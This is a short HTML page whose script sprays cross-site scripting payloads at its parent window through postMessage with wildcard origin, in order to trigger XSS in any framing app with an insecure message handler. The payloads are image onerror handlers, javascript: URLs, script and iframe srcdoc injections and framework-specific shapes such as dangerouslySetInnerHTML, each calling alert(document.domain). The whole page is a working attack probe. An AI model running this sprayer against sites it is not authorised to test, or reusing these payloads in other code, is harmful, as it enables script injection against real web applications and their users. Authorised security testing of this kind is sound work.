<!DOCTYPE html>
<html>
<body>
<script>
// Spray postMessage payloads at the parent window
// If the parent app has an insecure message handler, one of these may trigger XSS

const payloads = [
  // Common framework patterns
  '<img src=x onerror=alert(document.domain)>',
  '{"type":"redirect","url":"javascript:alert(document.domain)"}',
  '{"action":"navigate","href":"javascript:alert(document.domain)"}',
  '{"html":"<img src=x onerror=alert(document.domain)>"}',
  '{"template":"<script>alert(document.domain)<\\/script>"}',
  '{"callback":"alert","args":["document.domain"]}',
  '{"event":"load","data":"<iframe srcdoc=\\"<script>alert(document.domain)</script>\\">"}',
  // Angular/React patterns  
  '{"__zone_symbol__":"alert(document.domain)"}',
  '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}',
];

payloads.forEach((p, i) => {
  setTimeout(() => {
    window.parent.postMessage(p, '*');
  }, i * 100);
});

console.log("postMessage spray complete");
</script>
</body>
</html>
